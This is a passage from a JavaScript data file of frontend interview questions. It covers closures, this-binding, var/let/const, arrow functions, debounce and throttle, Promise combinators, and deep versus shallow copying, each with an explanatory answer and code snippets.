      realWorldExamples: [
        "IKEA, American Express, Spotify (in parts) — all have public micro-frontend write-ups.",
      ],
      seniorDiscussion:
        "Discuss organizational drivers (Conway's law), cost of ceremony (per-app pipelines, deploy infra), and how to migrate back if the split was wrong.",
      relatedSlugs: [
        "structure-scalable-frontend-app-100-pages",
        "how-would-you-design-a-reusable-component-library-across-teams",
      ],
      companyTags: ["Spotify", "IKEA", "Amex", "Atlassian"],
      estimatedReadingMinutes: 11,
      estimatedSolvingMinutes: 20,
    },
  },

  // ============================================================
  // JAVASCRIPT FUNDAMENTALS (added batch)
  // ============================================================
  {
    title: "What are closures in JavaScript?",
    aliases: ["closures javascript", "explain closures", "closure with real-world use cases"],
    question: {
      id: "what-are-closures-in-javascript",
      slug: "what-are-closures-in-javascript",
      title: "What are closures in JavaScript?",
      category: "javascript",
      subcategory: "Scope & Closures",
      tags: ["closures", "scope", "lexical-environment", "functions"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "A closure is a function bundled with the variables in scope at the time it was created — it remembers and can mutate those variables long after the outer function has returned.",
      answer: `A **closure** is the combination of a function with the lexical environment in which it was declared. When that inner function is invoked later — possibly long after the outer function has returned — it still has access to the variables from its surrounding scope. Closures are one of JavaScript's most powerful primitives, and they're the mechanism behind hooks, modules, currying, event handlers, and most "remember this state across calls" patterns in the language.

**Why closures exist: lexical scoping.** JavaScript resolves a function's *free variables* (variables it uses but doesn't declare) against the scope in which the function was **defined**, not the scope in which it is **called**. This is called *static* or *lexical* scoping, and it's the opposite of dynamic scoping (which a few older languages like classic Lisp had). Because the engine has to keep that defining scope reachable for as long as the function might still run, it keeps the entire variable environment alive — that's the "closure."

**The mental model.** When the JS engine creates a function, it stores a hidden reference to its **environment record** — the variable bindings in scope at creation. When the function executes, lookups go: own arguments → environment record → enclosing environment records, recursively, until the global scope. This is the *scope chain*. The closure is literally "function + chain of environment records pinned alive by reachability."

**What closures enable:**

1. **Data privacy** — the *module pattern*: \`const counter = (() => { let n = 0; return { inc: () => ++n, get: () => n }; })();\` — \`n\` is unreachable from outside; only the returned functions can touch it. Pre-ES6 classes, this was *the* way to get private state.
2. **Factories and partial application** — \`function adder(x) { return y => x + y; }\` — \`adder(5)\` returns a new function that has \`x\` permanently bound to \`5\`.
3. **Currying** — \`mul(2)(3)(4)\` decomposes a multi-arg function into a chain of single-arg ones, each closing over the previous result.
4. **Callbacks and event handlers** — every \`element.addEventListener('click', () => doThing(id))\` is a closure over the surrounding \`id\`.
5. **React hooks** — \`useState\` returns a setter that closes over a fiber-local cell; the entire hooks system is closures over the current fiber.
6. **Memoization** — a cache map declared in the outer function persists across calls of the inner.

**Classic gotcha: \`var\` in a loop.**

\`\`\`js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
// Logs: 3, 3, 3 — all three callbacks closed over the same i.
\`\`\`

\`var\` is function-scoped, so there's *one* \`i\` shared by all three callbacks. By the time they run, the loop has finished and \`i === 3\`. Switching to \`let\` fixes it: \`let\` is block-scoped, so each iteration gets its own \`i\` binding, and each callback closes over its own.

**The cost of closures: memory.** Closures keep their entire environment record alive — including variables the inner function doesn't actually use, because the engine usually can't prove what's unused. If the inner function survives (stored in a long-lived data structure, an event listener that's never removed, a setInterval callback), the outer scope's variables can't be garbage collected. This is the most common shape of SPA memory leaks: a handler attached on mount and never removed, holding a megabyte of component-local state alive forever. Mitigations:
- Always pair \`addEventListener\` with \`removeEventListener\` (or use \`AbortController\`).
- For \`setInterval\` / \`setTimeout\`, store the timer id and clear on cleanup.
- Don't capture large objects in long-lived closures when a small id will do.

**\`this\` is not part of the closure.** Common confusion: \`this\` is determined by *how the function is called* (call site), not by where it was defined — except for arrow functions, which inherit \`this\` from their enclosing scope at definition time. So an arrow function "closes over" \`this\` lexically; a regular function doesn't.

**Performance.** Closure creation in modern engines is cheap (one allocation for the environment record). Property access is closures' real cost: looking up a variable through the scope chain is slower than reading a known local. Inside hot loops, hoist references to locals.

**Interview-ready definition.** "A closure is a function plus the lexical scope it was declared in — when the function runs later, it still has access to those variables. It's how JavaScript implements private state, factories, currying, and React's hook model. The trade-off is that it keeps the captured scope alive, which is the most common SPA memory-leak shape."`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Counter factory — each call returns its own private count",
          code: `function makeCounter() {
  let count = 0;                  // private to each counter instance
  return {
    inc: () => ++count,
    get: () => count,
  };
}

const a = makeCounter();
const b = makeCounter();
a.inc(); a.inc();
console.log(a.get(), b.get());   // 2, 0  — independent state`,
        },
        {
          language: "ts",
          caption: "Classic var-in-loop bug + the let fix",
          code: `for (var i = 0; i < 3; i++) setTimeout(() => console.log(i), 0);
// 3, 3, 3  — one shared 'i'

for (let i = 0; i < 3; i++) setTimeout(() => console.log(i), 0);
// 0, 1, 2  — fresh binding per iteration`,
        },
      ],
      followUps: [
        "How do closures cause memory leaks, and how do you fix them?",
        "Implement a once() that lets a function run only on its first call.",
        "How do React hooks rely on closures? What's the stale-closure problem?",
      ],
      commonMistakes: [
        "Confusing closure with the function itself — the closure is function + environment.",
        "Reading a value captured by a closure and assuming it reflects current state (stale closure inside useEffect / setInterval).",
        "Using var in a loop and expecting each iteration to capture its own value.",
      ],
      performanceConsiderations: [
        "Closures hold references to outer scope. A long-lived event listener can pin large objects in memory — null them out on cleanup.",
        "Recreating closures inside hot render paths (e.g. inline handlers) is fine in React; the cost is GC pressure, not correctness.",
      ],
      edgeCases: [
        "Closures over `let`/`const` create per-iteration bindings; over `var` they share one binding.",
        "A closure capturing `this` from an arrow function follows lexical `this`; from a regular function it doesn't.",
      ],
      realWorldExamples: [
        "React hooks: each render's callbacks close over that render's state — the source of stale-closure bugs in setInterval.",
        "Module pattern (pre-ESM): an IIFE returns an object whose methods close over private state.",
      ],
      seniorDiscussion:
        "Senior signal: explain how V8 represents closures as ScopeChain objects, when escape analysis can avoid heap allocation, and how the stale-closure problem in React is solved with refs or functional setState.",
      relatedSlugs: ["how-does-garbage-collection-work-internally"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "Explain this, call, apply, and bind",
    aliases: ["this call apply bind", "call apply bind difference", "this keyword javascript"],
    question: {
      id: "explain-this-call-apply-bind",
      slug: "explain-this-call-apply-bind",
      title: "Explain `this`, call, apply, and bind",
      category: "javascript",
      subcategory: "this & Binding",
      tags: ["this", "call", "apply", "bind", "function-context"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "`this` is determined at call time by how the function is invoked. `call`/`apply` invoke immediately with a chosen `this`; `bind` returns a new function permanently bound to it.",
      answer: `Of all the topics that trip up JavaScript candidates, \`this\` ranks #1 — and the reason is that the rules look ad-hoc until you internalize one core idea: **\`this\` is resolved at the call site, not at the definition site** (for regular functions). Arrow functions are the deliberate exception: they capture \`this\` lexically, the way variables do.

**The four binding rules, in strict priority order:**

1. **\`new\` binding.** \`new Foo(...)\` creates a brand-new object, sets \`this\` to it, runs the constructor body, and (unless the constructor returns its own object) returns the new object. Highest priority — overrides everything else.

2. **Explicit binding.** \`fn.call(ctx, a, b)\` invokes \`fn\` immediately with \`this === ctx\` and \`a, b\` as arguments. \`fn.apply(ctx, [a, b])\` is the same but takes arguments as an array — useful when you don't know the arity statically. \`fn.bind(ctx, a)\` returns a *new* function permanently bound to \`ctx\` with \`a\` partially applied. \`bind\` cannot be re-bound; the first \`bind\` sticks. With \`new\`, the bound \`this\` is ignored.

3. **Implicit binding.** When called as a method (\`obj.fn()\`), \`this\` is the object the function was accessed *from*. Crucially, the binding lives at the call site, not the reference: \`const f = obj.fn; f()\` *loses* the binding because the method invocation form is gone. This is the source of countless "lost \`this\`" bugs when handlers are detached and passed around.

4. **Default binding.** No \`new\`, no explicit \`call/apply/bind\`, no method invocation → \`this\` falls back to the global object (\`window\` / \`globalThis\`) in **non-strict** mode, or **\`undefined\`** in **strict** mode (and inside ES modules and class bodies, which are strict by default).

**Arrow functions ignore all four rules.** Arrows do not have their own \`this\`; lookup falls through to the enclosing function's \`this\` at the moment the arrow was *defined*. That's why \`obj.method = () => this\` is almost always a bug — it captures the outer scope's \`this\` (which, in a module, is \`undefined\`), not \`obj\`. Conversely, arrow callbacks are perfect for situations where you *want* \`this\` to inherit: \`array.map(x => this.transform(x))\` inside a method does the right thing without \`bind\`.

**Call vs apply vs bind — when to use which:**

- **\`call\`**: known argument count, spread inline. \`fn.call(ctx, a, b, c)\`.
- **\`apply\`**: argument array. Common before ES6 spread for forwarding arguments: \`fn.apply(this, arguments)\`. With ES6, \`fn.call(this, ...arguments)\` is equivalent.
- **\`bind\`**: you need a long-lived reference with \`this\` locked in (event handlers, callbacks passed to libraries that don't preserve context). Also enables **partial application**: \`fn.bind(ctx, a)\` is a new function that always prepends \`a\`.

**Concrete examples that interviewers ask about:**

\`\`\`js
const user = { name: 'Ada', hi() { return \\\`Hi, \\\${this.name}\\\`; } };
user.hi();                  // "Hi, Ada" — implicit binding
const f = user.hi; f();     // "Hi, undefined" (strict) — binding lost
user.hi.call({name:'Bob'}); // "Hi, Bob" — explicit binding wins
const bound = user.hi.bind({name:'Eve'});
bound();                    // "Hi, Eve"
new (function() { console.log(this); })(); // {} new instance — new binding
\`\`\`

**Class methods.** Methods on the prototype are *not* auto-bound. \`const fn = instance.method; fn()\` loses \`this\`. Two common fixes: bind in the constructor (\`this.method = this.method.bind(this)\`), or use **arrow class fields** (\`method = () => {...}\`). Both create per-instance allocations — fine for typical UI components, but worth knowing for tight allocation patterns.

**\`this\` in callbacks** is the classic React 15 pain: \`<button onClick={this.handleClick}>\` lost \`this\`, so you wrote \`onClick={this.handleClick.bind(this)}\` (creates a new function every render, breaks \`React.memo\`) or arrow class fields. With hooks and function components, the problem disappears — there's no \`this\` to lose.

**Pitfalls and edge cases:**

- **\`bind\` is one-shot.** \`fn.bind(a).bind(b)\` is still bound to \`a\` — the second \`bind\` is ignored for \`this\` (it can still add partial args).
- **\`bind\` with \`new\`** ignores the bound \`this\` and creates a fresh instance.
- **Strict mode default** — top-level \`this\` is \`undefined\` in modules; legacy scripts get \`window\`.
- **Method extraction** (\`document.addEventListener('click', this.handler)\`) loses \`this\` unless you bind or use arrow fields.
- **Arrow functions in object literals** — \`{ greet: () => this.name }\` captures the *enclosing* \`this\`, not the object.
- **Each \`bind\` allocates** a new function — avoid in hot render paths.

**The summary for interviews.** "Regular functions resolve \`this\` at the call site by one of four rules in priority order: \`new\`, explicit (\`call/apply/bind\`), implicit (method call), default. Arrow functions ignore all four and inherit \`this\` lexically. \`call\` and \`apply\` invoke immediately; \`bind\` returns a new function permanently bound to a context."`,
      codeSnippets: [
        {
          language: "ts",
          caption: "All four side-by-side",
          code: `function greet(greeting: string, punct: string) {
  return \`\${greeting}, \${this.name}\${punct}\`;
}
const user = { name: "Ada" };

greet.call(user, "Hi", "!");          // "Hi, Ada!"  — args spread
greet.apply(user, ["Hi", "!"]);       // "Hi, Ada!"  — args as array
const bound = greet.bind(user, "Hi"); // partially applied
bound("?");                           // "Hi, Ada?"`,
        },
        {
          language: "ts",
          caption: "Polyfill of bind (the classic interview ask)",
          code: `Function.prototype.myBind = function (ctx: any, ...preset: any[]) {
  const fn = this;
  return function (this: any, ...later: any[]) {
    // If called with 'new', honor that and ignore ctx.
    const calledWithNew = this instanceof (fn as any);
    return fn.apply(calledWithNew ? this : ctx, [...preset, ...later]);
  };
};`,
        },
      ],
      followUps: [
        "Why doesn't `this` work in an arrow function the way you might expect?",
        "Implement Function.prototype.call from scratch.",
        "How does class method binding interact with React event handlers?",
      ],
      commonMistakes: [
        "Detaching a method from its object (`const f = obj.method`) and expecting `this` to survive.",
        "Using arrow functions as object methods or class prototype methods.",
        "Calling `bind` repeatedly — only the first `bind` sticks; the second is ignored.",
      ],
      performanceConsiderations: [
        "Each `bind` allocates a new function — avoid in tight loops or hot render paths.",
        "Class methods bound in the constructor allocate per-instance; arrow class fields allocate per-instance too. Prototype methods are shared — bind at the call site if you need stable identity.",
      ],
      edgeCases: [
        "`bind` cannot be re-bound — `fn.bind(a).bind(b)` is still bound to `a`.",
        "Calling a bound function with `new` ignores the bound `this` and creates a new instance.",
      ],
      realWorldExamples: [
        "React class components used to need `this.handler = this.handler.bind(this)` in the constructor before arrow class fields became common.",
        "Array-likes use `Array.prototype.slice.call(arguments)` to convert to a real array (pre-ES6).",
      ],
      seniorDiscussion:
        "Senior signal: discuss the strict-mode differences for default `this`, why arrow functions in class fields create per-instance allocations, and how `Function.prototype.bind` is specified to mark the result with `[[BoundTargetFunction]]`.",
      relatedSlugs: ["what-are-closures-in-javascript"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Difference between var, let, and const",
    aliases: ["var let const", "var vs let vs const", "let const difference"],
    question: {
      id: "var-vs-let-vs-const",
      slug: "var-vs-let-vs-const",
      title: "Difference between `var`, `let`, and `const`",
      category: "javascript",
      subcategory: "Variables & Hoisting",
      tags: ["var", "let", "const", "hoisting", "tdz", "scope"],
      difficulty: "easy",
      frequency: "very-high",
      seniority: "junior",
      shortDescription:
        "`var` is function-scoped and hoisted to `undefined`. `let`/`const` are block-scoped with a temporal dead zone. `const` forbids reassignment but the value can still be mutated.",
      answer: `Three axes to compare:

| | \`var\` | \`let\` | \`const\` |
|---|---|---|---|
| **Scope** | function | block | block |
| **Hoisting** | hoisted, initialized to \`undefined\` | hoisted, but in TDZ until declaration | same as let |
| **Reassign** | yes | yes | no |
| **Redeclare in same scope** | yes (silently) | no (SyntaxError) | no |

The **Temporal Dead Zone (TDZ)** is the window between entering a block and the actual \`let\`/\`const\` line — accessing the binding throws \`ReferenceError\`. This catches typos that \`var\` would silently let through.

\`const\` blocks reassignment of the *binding*, not mutation of the *value*. \`const arr = []; arr.push(1)\` is fine; \`const arr = []; arr = [1]\` is not.

Default to \`const\`. Use \`let\` only when you actually reassign. Reach for \`var\` essentially never in modern code — the only legitimate case is hot-patching legacy scripts that rely on its hoisting.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Scope and TDZ",
          code: `if (true) {
  var x = 1;   // leaks to enclosing function
  let y = 2;   // dies at the closing brace
}
console.log(x); // 1
console.log(y); // ReferenceError

console.log(z); // ReferenceError — TDZ
let z = 3;`,
        },
        {
          language: "ts",
          caption: "const blocks rebinding, not mutation",
          code: `const user = { name: "Ada" };
user.name = "Bea";   // ok — mutating the value
// user = {};        // TypeError — can't reassign the binding`,
        },
      ],
      followUps: [
        "What is the temporal dead zone, and why does it exist?",
        "How does hoisting differ between function declarations and var?",
        "Why does using let in a for loop fix the classic closure-in-loop bug?",
      ],
      commonMistakes: [
        "Thinking `const` makes the value immutable — it doesn't.",
        "Using `var` in a `for` loop and being surprised that callbacks all see the final value.",
        "Believing TDZ means the variable isn't hoisted — it is, but accessing it throws.",
      ],
      performanceConsiderations: [
        "TDZ checks have negligible runtime cost; modern engines elide them after the first read.",
        "Block scoping enables tighter escape analysis and smaller closure environments — generally a win.",
      ],
      edgeCases: [
        "`typeof` on a TDZ binding still throws (unlike on a truly undeclared identifier, where it returns 'undefined').",
        "`var` declarations at the top of a module bind to the module scope, not the global object — unlike scripts.",
      ],
      realWorldExamples: [
        "ESLint's `prefer-const` codifies the 'default to const' rule across most modern codebases.",
        "TypeScript narrowing works better with `const` because the binding can't change between checks.",
      ],
      seniorDiscussion:
        "At senior level you should be able to talk about how V8 represents these in its environment records, why `let` in a for-loop creates a per-iteration binding (a spec choice for closure correctness), and how this interacts with `for..in` / `for..of` iteration order.",
      relatedSlugs: ["what-are-closures-in-javascript"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 8,
    },
  },

  {
    title: "Difference between arrow functions and regular functions",
    aliases: ["arrow vs regular functions", "arrow function vs regular function"],
    question: {
      id: "arrow-vs-regular-functions",
      slug: "arrow-vs-regular-functions",
      title: "Difference between arrow functions and regular JavaScript functions",
      category: "javascript",
      subcategory: "Functions",
      tags: ["arrow-functions", "this", "functions", "es6"],
      difficulty: "easy",
      frequency: "very-high",
      seniority: "junior",
      shortDescription:
        "Arrow functions inherit `this`/`arguments` lexically, can't be used with `new`, and have no `prototype`. Regular functions get their own `this` based on the call site and can be constructors.",
      answer: `Arrow functions are not "just a shorter syntax" for regular functions — they are a **semantically different** function form. Treating them as interchangeable is the most common source of \`this\`-related bugs in modern JavaScript. Understanding seven differences, and when each matters, is what an interviewer is checking for.

**1. \`this\` — lexical, not dynamic.** This is the headline. Regular functions resolve \`this\` at the call site (one of four binding rules: \`new\`, explicit, implicit, default). Arrow functions don't have their own \`this\` at all — lookup falls through to the enclosing function's \`this\` at the moment the arrow was *defined*. As a consequence: \`.call(ctx, ...)\`, \`.apply(ctx, ...)\`, and \`.bind(ctx)\` **cannot change** an arrow's \`this\`. They silently accept the context argument and ignore it. This is exactly why arrows are perfect for callbacks where you want to inherit \`this\` from the enclosing method, and exactly why they're wrong for object methods that should be called with method-binding syntax.

**2. \`arguments\` — not present.** Regular functions get the magic \`arguments\` array-like inside their body; arrows don't. Use rest parameters instead: \`const f = (...args) => args.length\`. This is by design — \`arguments\` is treated as legacy in modern JS, and rest parameters are properly typed in TypeScript.

**3. \`new\` — not constructible.** \`new (() => {})\` throws \`TypeError: ... is not a constructor\`. Arrows don't have the internal \`[[Construct]]\` slot. So they can't be used as constructors and can't have an implicit \`prototype\`.

**4. \`prototype\` — not present.** A regular function has a \`.prototype\` property (used by \`new\` to set up the new instance's prototype chain). Arrows don't, which is why \`class Foo { method = () => {} }\` (an arrow class field) is per-instance allocation, not a prototype method.

**5. Hoisting and TDZ.** Function *declarations* (\`function foo() {}\`) are hoisted whole — name and body both available before the line. Arrow functions are always *expressions* assigned to a binding (\`const foo = () => {}\`), so they obey TDZ: referencing \`foo\` before the assignment line throws \`ReferenceError\`. Don't expect "function defined later in the file" semantics with arrows.

**6. Generators — not supported.** There is no \`function*\` arrow form. If you need a generator, use a regular function: \`function* gen() { yield 1; }\`.

**7. Implicit return + brevity.** Single-expression arrows return the expression without \`return\`: \`const sq = x => x * x\`. Wrapping the body in \`{}\` makes it a block, so you need explicit \`return\`. Returning an object literal needs parentheses: \`x => ({ y: x })\` (otherwise \`{ y: x }\` is parsed as a block).

**Practical heuristic: when to use which.**

- **Use arrows** for: callbacks passed to \`map/filter/reduce\`; \`setTimeout\`/\`setInterval\` callbacks inside class or object methods (so \`this\` stays bound); React render-prop functions; event handlers in functional components.
- **Use regular functions** for: methods on objects/classes that need their own \`this\` and benefit from prototype sharing; constructors and class definitions; generators; functions where you want hoisting semantics.

**Common pitfalls and patterns:**

- \`const obj = { name: 'X', greet: () => this.name }\` — captures the **enclosing** scope's \`this\` (\`undefined\` in modules), not \`obj\`. Use \`greet() { return this.name; }\` for a true method.
- React class arrow fields (\`onClick = () => this.handle()\`) — bind \`this\` correctly but allocate one closure per instance. Prototype methods are shared; the trade-off is whether you need stable identity (memoization) more than memory.
- \`setInterval(function () { this.count++; }, 1000)\` inside a class — \`this\` is global. Either use an arrow, or \`.bind(this)\`.
- \`arguments.length\` in an arrow — TypeError. Use \`...args.length\`.

**TypeScript-specific note.** TypeScript handles \`this\` typing differently for arrows: \`this\` is inferred from the enclosing scope. Methods can declare a \`this\` parameter (\`function foo(this: User)\`) for type-checking; arrows can't.

**Interview-ready one-liner.** "Arrow functions are expressions that lexically capture \`this\` and \`arguments\` from their enclosing scope, can't be used with \`new\`, and don't have a \`prototype\`. They're best for callbacks; they're wrong for object methods or constructors. The most common bug is using an arrow where the caller expected \`this\` to be re-bindable."`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Lexical this matters",
          code: `class Timer {
  count = 0;
  start() {
    setInterval(function () {
      // 'this' is the global / undefined here — bug!
      this.count++;
    }, 1000);

    setInterval(() => {
      // arrow inherits 'this' from start() — works
      this.count++;
    }, 1000);
  }
}`,
        },
        {
          language: "ts",
          caption: "Don't use arrows where dynamic this is needed",
          code: `const obj = {
  name: "Ada",
  hello: () => \`hi \${this?.name}\`,    // 'this' is enclosing, not obj
  bye()  { return \`bye \${this.name}\`; },
};
obj.hello(); // "hi undefined"
obj.bye();   // "bye Ada"`,
        },
      ],
      followUps: [
        "Why can't arrow functions be used as constructors?",
        "Implement a polyfill for an arrow-style 'thisless' helper.",
        "Why do React class fields written as arrow functions cost more memory than prototype methods?",
      ],
      commonMistakes: [
        "Using an arrow as an object method and expecting `this` to refer to the object.",
        "Trying to access `arguments` inside an arrow function.",
        "Defining a class method as an arrow class field for 'auto-binding' without realizing it allocates per instance.",
      ],
      performanceConsiderations: [
        "Arrow class fields allocate one function per instance; prototype methods allocate one shared per class. Matters at thousands of instances.",
      ],
      edgeCases: [
        "An arrow returning an object literal needs parens: `() => ({ a: 1 })`. Without them, `{ a: 1 }` is a block.",
        "`Function.prototype.bind` on an arrow is a no-op for `this`, but still applies partial args.",
      ],
      realWorldExamples: [
        "React event handlers: `<button onClick={() => save(id)}>` — arrow keeps the component's `this`/closures and is the idiomatic pattern.",
      ],
      seniorDiscussion:
        "Senior level: discuss how the absence of `[[Construct]]` makes arrows lighter on the engine, when escape analysis can stack-allocate them, and why method shorthand (`{ foo() {} }`) is preferable to `foo: function() {}` in modern code.",
      relatedSlugs: ["explain-this-call-apply-bind", "var-vs-let-vs-const"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 8,
    },
  },

  {
    title: "Debounce vs throttle — implement both",
    aliases: ["debounce vs throttle", "implement debounce throttle", "debounce throttle"],
    question: {
      id: "debounce-vs-throttle",
      slug: "debounce-vs-throttle",
      title: "Debounce vs throttle — implement both",
      category: "javascript",
      subcategory: "Rate Limiting",
      tags: ["debounce", "throttle", "performance", "events"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Debounce delays the call until activity stops; throttle caps how often the call can fire. Both control noisy events but solve different problems.",
      answer: `**Debounce** — fires once after the input has been quiet for *N* ms. Use for: search-as-you-type, autosave on form input, window-resize end. The user sees no work happen until they pause.

**Throttle** — fires at most once per *N* ms while activity continues. Use for: scroll handlers, mouse-move tracking, drag, analytics. The user sees regular updates while they keep going.

Mental model: debounce *waits for silence*, throttle *paces the signal*.

Implementation traps to mention:
- \`leading\` vs \`trailing\` edge — does the first call fire immediately or only after the wait?
- Cancellation — return a \`.cancel()\` so React effects can clean up.
- Preserving \`this\` and \`arguments\` of the call.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Debounce — trailing edge with cancel()",
          code: `function debounce<T extends (...a: any[]) => any>(fn: T, wait = 200) {
  let t: ReturnType<typeof setTimeout> | null = null;
  function debounced(this: any, ...args: Parameters<T>) {
    if (t) clearTimeout(t);
    t = setTimeout(() => fn.apply(this, args), wait);
  }
  debounced.cancel = () => { if (t) { clearTimeout(t); t = null; } };
  return debounced as T & { cancel: () => void };
}`,
        },
        {
          language: "ts",
          caption: "Throttle — leading edge, with trailing flush",
          code: `function throttle<T extends (...a: any[]) => any>(fn: T, wait = 200) {
  let last = 0, t: ReturnType<typeof setTimeout> | null = null, lastArgs: any[] = [];
  return function (this: any, ...args: Parameters<T>) {
    const now = Date.now();
    const remaining = wait - (now - last);
    lastArgs = args;
    if (remaining <= 0) {
      if (t) { clearTimeout(t); t = null; }
      last = now;
      fn.apply(this, args);
    } else if (!t) {
      t = setTimeout(() => {
        last = Date.now();
        t = null;
        fn.apply(this, lastArgs);
      }, remaining);
    }
  };
}`,
        },
      ],
      followUps: [
        "When would you use both debounce and a maxWait together?",
        "How does requestAnimationFrame compare to a 16ms throttle for scroll handlers?",
        "How do you correctly debounce inside a React component (closure pitfalls)?",
      ],
      commonMistakes: [
        "Calling debounce/throttle inside render — every render creates a new instance, so the timer never accumulates.",
        "Forgetting to cancel on unmount — the timer fires after the component is gone and crashes setState.",
        "Confusing the two: using debounce for scroll (jumps after pause) or throttle for search (extra requests).",
      ],
      performanceConsiderations: [
        "For 60fps UI work tied to events, prefer `requestAnimationFrame` over a 16ms throttle — it aligns with frames and pauses on hidden tabs.",
        "Throttling DOM-touching handlers prevents layout thrashing; debouncing them delays the cost.",
      ],
      edgeCases: [
        "Page-hidden tabs (`visibilitychange`) freeze setTimeout to a coarse cadence — throttle accuracy suffers.",
        "Trailing-edge debounce on unmount can fire after the component is gone if you don't cancel.",
      ],
      realWorldExamples: [
        "Search-as-you-type with a 300ms debounce avoids one API call per keystroke.",
        "Infinite-scroll position checks throttled to 100ms keep CPU calm while preserving smoothness.",
      ],
      seniorDiscussion:
        "At senior level discuss leading+trailing semantics, maxWait (lodash), and how you'd test these (fake timers + flush).",
      relatedSlugs: ["how-do-you-optimize-core-web-vitals"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 15,
    },
  },

  {
    title: "Promise.all vs allSettled vs race vs any",
    aliases: ["promise.all vs allSettled vs race", "promise combinators"],
    question: {
      id: "promise-all-vs-allsettled-vs-race",
      slug: "promise-all-vs-allsettled-vs-race",
      title: "Promise.all vs allSettled vs race vs any — when do you use each?",
      category: "javascript",
      subcategory: "Promises",
      tags: ["promises", "async", "promise-all", "promise-race", "promise-allsettled"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "all = fail-fast aggregation. allSettled = collect every outcome. race = first to settle (resolve or reject). any = first to *resolve*, ignores rejections until all fail.",
      answer: `Four combinators with very different semantics:

- **\`Promise.all([p1, p2])\`** — resolves with an array of values once *all* resolve. Rejects **immediately** with the first rejection. Other promises keep running but their results are dropped. Use when you need every result and a partial result is meaningless.
- **\`Promise.allSettled([p1, p2])\`** — always resolves, with an array of \`{ status: 'fulfilled'|'rejected', value|reason }\`. Use when partial success is fine — dashboards, telemetry, fan-out where you want to render whatever returned.
- **\`Promise.race([p1, p2])\`** — settles with the first promise to settle, **whether resolve or reject**. Use for timeouts: race the work against \`setTimeout(reject)\`.
- **\`Promise.any([p1, p2])\`** — resolves with the first **fulfilled** promise; only rejects (with \`AggregateError\`) if every input rejects. Use for redundancy: the same request to multiple mirrors.

Key gotcha: \`Promise.all\` does not cancel the losers. If you start 5 fetches and one rejects, the other 4 still run, still consume bandwidth, and their unhandled rejections can warn the console — wire them through \`AbortController\` if you need real cancellation.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Side-by-side outcomes",
          code: `const ok    = Promise.resolve(1);
const slow  = new Promise(r => setTimeout(() => r(2), 200));
const fail  = Promise.reject(new Error("nope"));

await Promise.all([ok, slow, fail]).catch(e => e.message);
// "nope"  — fails fast

await Promise.allSettled([ok, slow, fail]);
// [{fulfilled,1},{fulfilled,2},{rejected, Error: nope}]

await Promise.race([slow, fail]).catch(e => e.message);
// "nope"  — first to settle, and it rejected

await Promise.any([fail, slow]);  // 2  — first fulfilled`,
        },
        {
          language: "ts",
          caption: "Timeout pattern with race + AbortController",
          code: `async function fetchWithTimeout(url: string, ms = 3000) {
  const ctrl = new AbortController();
  const timeout = new Promise<never>((_, rej) =>
    setTimeout(() => { ctrl.abort(); rej(new Error("timeout")); }, ms),
  );
  return Promise.race([fetch(url, { signal: ctrl.signal }), timeout]);
}`,
        },
      ],
      followUps: [
        "How would you implement Promise.all from scratch?",
        "Why doesn't Promise.all cancel the other promises on rejection?",
        "When would you prefer allSettled over all in a UI dashboard?",
      ],
      commonMistakes: [
        "Using `Promise.all` for independent panels and crashing the whole UI on one failure.",
        "Forgetting that `race` resolves on rejection too — and being surprised when an error wins.",
        "Assuming losers in `all` are cancelled (they aren't).",
      ],
      performanceConsiderations: [
        "Concurrency control: `Promise.all(arr.map(fetch))` with a 1000-item array opens 1000 sockets. Use a pool/limit (`p-limit`) for bounded concurrency.",
      ],
      edgeCases: [
        "`Promise.all([])` resolves with `[]` immediately. `Promise.any([])` rejects with empty `AggregateError`.",
        "`Promise.race([])` returns a forever-pending promise — easy way to leak.",
      ],
      realWorldExamples: [
        "Server-side rendering: `Promise.all` for required data, `allSettled` for nice-to-have widgets so a slow widget can't block the page.",
      ],
      seniorDiscussion:
        "Senior signal: cancellation strategy with AbortController, structured concurrency patterns, and the difference between an unhandled rejection (process-level event) and a swallowed one inside `all`.",
      relatedSlugs: ["how-does-the-event-loop-prioritize-microtasks-vs-macrotasks"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Deep copy vs shallow copy",
    aliases: ["deep copy vs shallow copy", "deep vs shallow copy", "shallow copy deep copy"],
    question: {
      id: "deep-copy-vs-shallow-copy",
      slug: "deep-copy-vs-shallow-copy",
      title: "Deep copy vs shallow copy — behavior and how to achieve each",
      category: "javascript",
      subcategory: "Objects & References",
      tags: ["deep-copy", "shallow-copy", "structuredClone", "immutability"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Shallow copy duplicates the top level; nested objects are still shared references. Deep copy recursively duplicates every level. Use `structuredClone` for a correct, fast deep copy.",
      answer: `A **shallow copy** creates a new object whose top-level properties are copied, but any property that is itself an object/array still points to the same memory as the original. Mutating a nested value visibly affects both.

A **deep copy** walks the entire tree and copies every nested object, so the result is fully independent.

Common ways to make each:

- **Shallow:** \`{...obj}\`, \`Object.assign({}, obj)\`, \`arr.slice()\`, \`Array.from(arr)\`.
- **Deep:** \`structuredClone(obj)\` (built-in, handles cycles, Maps, Sets, typed arrays, Dates), or for plain JSON: \`JSON.parse(JSON.stringify(obj))\` (loses functions, undefined, Dates become strings, throws on cycles).

\`structuredClone\` is the right answer in any modern environment. Mention it before \`JSON.parse(JSON.stringify())\`.

